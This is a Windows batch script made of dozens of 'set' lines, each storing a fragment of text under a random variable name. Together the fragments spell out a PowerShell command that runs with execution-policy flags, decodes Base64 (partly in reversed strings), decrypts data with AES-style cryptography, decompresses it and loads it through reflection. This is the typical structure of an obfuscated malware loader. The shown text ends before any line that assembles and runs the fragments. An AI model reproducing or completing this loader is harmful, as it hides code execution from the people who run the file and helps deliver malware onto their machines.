@echo off
set "XtayocvJRM=do"
set "yVePhebrbd=\v"
set "qDrcwFXnYD=st"
set "uxtRUCLOQP=rs"
set "yzViqbLxfT=he"
set "sCOzdScvqF=s\"
set "ZtwcXBiEos=we"
set "bmfUKZbFXH=:\"
set "KAiYKFdaNy=Sy"
set "JAxHDuhLgz=py"
set "RFommBBKru=xe"
set "maNnpPHKao=em"
set "srEtaCufbl=po"
set "lQpLoxuCXD=ow"
set "rwjehlJynV=nd"
set "WMIfMatqjk=we"
set "XFnpjSloaA=ws"
set "pVkqZsgDzp=0\"
set "msOAjwPWNq=co"
set "cLyDLVzisx=ll"
set "VJSPcxQzOL=1."
set "vnZnaHDKQH=Wi"
set "FVHCtvRvpA=Po"
set "jnhIkKHraJ=32"
set "kBohUVYNzx=.e"
set "ttPymOkMcy=\W"
set "wJPOpIYQgY= /"
set "tAUpBpAhCz=rS"
set "dDvsExjKQP=y "
set "YyRLKDfyOz=he"
set "laurPlXiCj=ll"
set "VOwMsJNVJV=in"
set "fbJqmolZGc= C"
set "IKWfBMFCdI= %~dp0"
set "UoiXPmtYZk=cd"
set "seKbEtKLTe=ss -"
set "EOJPefnIde=ing("
set "hQkWxUluIl=PKCS"
set "oOUpjDNBsS=]::C"
set "ojUFwJATRM=.Len"
set "woWETlEEPv=ionM"
set "HnAVNSesJS=S46e"
set "yhesrktJxG=ress"
set "LYbRyoqbKk=V.Su"
set "OjwHTrUyhc=Syst"
set "irRWHOxvSK=O.Me"
set "OsaqeshirJ=ment"
set "JjKPVOWJYs=K = "
set "hguMdXBDqx=yTo("
set "NcUanUfwXl=1..-"
set "bYfweFEddR=.Com"
set "RlsIoixxuN=tem."
set "bfKovphXZz=ptog"
set "zrFdlGZhXa=..-1"
set "ZaaUSIieuF=V = "
set "qUgeBkCJHh== [S"
set "vBHXZUYXfN=oint"
set "YsAnpJuKTA=rans"
set "ELvhfMufNJ=ypto"
set "DGMlGyLRrl='0Pg"
set "rCzHLexxIP=oin "
set "QXsQxWNXDB=Obje"
set "KytDUQYXcn=)($a"
set "rPDbETrPMg=gnir"
set "zCIWMZtigE=);$k"
set "KYKQqUpVxp=urit"
set "QzFjJqMUVH=16] "
set "zVBNWycrbk=stc "
set "mdVzpHHyLk=x) {"
set "scZQSvxvzC=mkEF"
set "XAeJmPtLop=]::("
set "QwvbdYYfpD= [Sy"
set "KfMHLWUCPh=nSlJ"
set "LoLdvnokWg=em.C"
set "TNvSXnpUMO=J = "
set "QSUMcPtRQA=IB.T"
set "MyaUKTXLBK=6] -"
set "inyVzVgvxK=iEoA"
set "BcqUMeNflE=dj0C"
set "nlrDpxGJht=Comp"
set "tGSwjaAyUa=oArr"
set "JxnsYWolNs=k; }"
set "NXpkyyBVIq=J = "
set "KVHtOWlHJT=th('"
set "cYtLMggVXL=ddin"
set "jzxtomhHXl=iast"
set "xLWUYfIiud=3); "
set "hDxoEhSZWL=tem."
set "YdEdahmGgU=stem"
set "btgKtFsAQq= '')"
set "rHkvwiWwiX=$kjM"
set "AcIqctaVcj=-joi"
set "nTFRaynBnu=$sQf"
set "AkiOCTTXGs=nage"
set "FWMcgjqcaB=brea"
set "zTjttDGygx=rt]:"
set "EsgTReRmLZ=hX, "
set "moQVeZCDKD=esMa"
set "xZBakBQlcX=pose"
set "bGKDhqoEnW=Disp"
set "SzzGiZZMhP=;$oD"
set "rqOowgfMer=gjYA"
set "GQdyRTVPnC=saBm"
set "BqxvxLbCwF=]::N"
set "ZONoFGvUPH=.-16"
set "ogsZaoosMa=eam("
set "rmIWXpsXOr=();$"
set "VYppBtbDEu=Comp"
set "QMULGlTKcs=J, 0"
set "yVXunwHThd=-4] "
set "ujTZlBLhJS=iEoA"
set "lIaAYRgSPS=esaB"
set "RPcGCfddaq=Secu"
set "GdBFDLuXkz=join"
set "IXrKXYqQVZ=Nnau"
set "cUpCIsZXOL=tion"
set "RjXHGLQUsZ=m.IO"
set "OozFpcKrwL=ring"
set "pUYaYegwgl=:('g"
set "JONbkRtxCR=YxVw"
set "HLyWglMMEp=;$oD"
set "nLnaGFlbLE=PxEW"
set "HVdcnPVqMN=('da"
set "sSACzLKoNo= = ["
set "QczWvPTzOL=comm"
set "utviYpYJUl=Stre"
set "VmmscfHqZx=, (,"
set "FEEPEDKIto=-ep "
set "YAXxMMhkDU=.Ass"
set "pXsmCBrsBs=tem."
set "eJIOTvPdvq=.Mod"
set "XeEGNTtKNi=Mode"
set "RNJNXVjBus=New-"
set "eHSnlupPBF=.Cre"
set "ZdJteCWPVw=sIB."
set "irILQOJnwx=ose("
set "uypspypTEH=rofi"
set "BtFKLrkQKQ=ay()"
set "LxFDagzFHP=y.Cr"
set "mHoElMMQMf=EFV "
set "tkYLEDmiOI=gMod"
set "ockWVpOHzp=l5E7"
set "UHGtCOuCKo=EK.D"
set "hkbnUFvMcd=gsYZ"
set "ttToUTRioP=Disp"
set "gCyaHXLszs=$lnS"
set "YBTByqCgxH=rtS4"
set "lmpLQhnfdn=Syst"
set "eJaSrVYxnt= = $"
set "vvFxXSWcWG=ck($"
set "TbhPzCeTrk=;$zi"
set "aFDsHsoIlJ=ewLi"
set "HbgBUVZziW=ress"
set "jWxBPLDtyC= [Sy"
set "ftzLHUsVBC=pher"
set "MWXlNMjbNd= New"
set "dzXIHhprwr=($mk"
set "ZlZEUOIUhp=gth)"
set "cFJFyTwTjE=[Sys"
set "mRjsbBiXkw=rity"
set "NwquSqOXSR=zHhH"
set "lbXCHZUozT=tsWi"
set "aLSzcClXjw=  $a"
set "IRskWpygPj=ptor"
set "YNJNKemBQR=sion"
set "mkwDTVcsLL= [st"
set "feFqgepKrc=[Sys"
set "rTaNIoSCkk=-Obj"
set "HauLMxIMYK=.Cop"
set "BOXkguEjHT=)) {"
set "hoLFiiVCxo='gni"
set "tmCLFLgXfb=-nop"
set "fIeIeprxst=ateD"
set "vIQCpEthkN=] -j"
set "msSRVHNZtK=BC;$"
set "pTOzzbbbOR=flec"
set "hRxsHHuYCp=.Dis"
set "cVsmPHMGdZ=)))"
set "XWRIufrciP=in $"
set "ADdkzjzBYr=X = "
set "xDNVAGSSNm=m.Re"
set "uvrtZaIfbd=iqEm"
set "OlpCEkocxG=au.I"
set "ZUOzDviqNc=y.Pa"
set "LpmDYvYLLM=qEm."
set "QQZxzvQOjt=yste"
set "CQtpzUFGAm=;$jC"
set "WaMlURUXVr=CFxo"
set "jgyEhVgqLE=ispo"
set "mqZPGgCEgq=em.I"
set "izBhpSrttg=jCJh"
set "rQKCOUqlfx=aGPU"
set "GzWljhYloM='[-1"
set "TyGxEwbOAx=kjME"
set "jyhBJOVdVZ=7;$o"
set "GSyBtwrgGC=lnSl"
set "KOLbNVBFAr=);$o"
set "IXqgWqirHn=]::("
set "eJoWLxaJdp=bjec"
set "PEtbfGIjuS=se()"
set "SdSMfIPccM=..-1"
set "OJMwroMpIg=);$o"
set "OEBEZSITIZ='txe"
set "GqLOTmlziz=('%*'"
set "oPtgjKPnan=106u"
set "EuAajecmBN=n ''"
set "qSiZMbTIPi=Fina"
set "SgmnjGTxXu=d;$o"
set "SItxMEHSBY=pose"
set "JXWSQwkpEC=form"
set "noyvxOixxO=ct S"
set "jSPwdhqkLZ=e]::"
set "IWqjwGpprH=t Sy"
set "ClZdazhWjo=ge);"
set "aCsOFaUchm=ge ="
set "VqoESQSlSB=.IO."
set "fHVWTlhEaC=vert"
set "oRJVPwsNTY=$sQf"
set "GYjJoWSpnV=stem"
set "qAPzAkryWV=);$s"
set "SrAXLlWtxS=TllA"
set "zXpZzzITpn= = $"
set "QVjXECabnK=.Key"
set "GHhsDIlEUF=lJ);"
set "TIBSEOZxmN=.Con"
set "IDhZFpcZNb=ptog"
set "tdnmpIcQGO=$jCJ"
set "QkHjWQfyXH=$oDs"
set "eEmVfkiGnB=JhX."
set "YydqThRjRq=stem"
set "SVEcZsfBvh= '')"
set "EitszzYGuV=ge.T"
set "OHAqDcvGgP=and "
set "YDTRBzLvWj=-1.."
set "isEgYDXczc=.Cry"
set "nBgjDNXoKa===')"
set "umrMqvfwKA=-joi"
set "wBLoTUartM=EFV."
set "ICFeAHcGJU=$lnS"
set "EKZoxJLQaB=ode]"
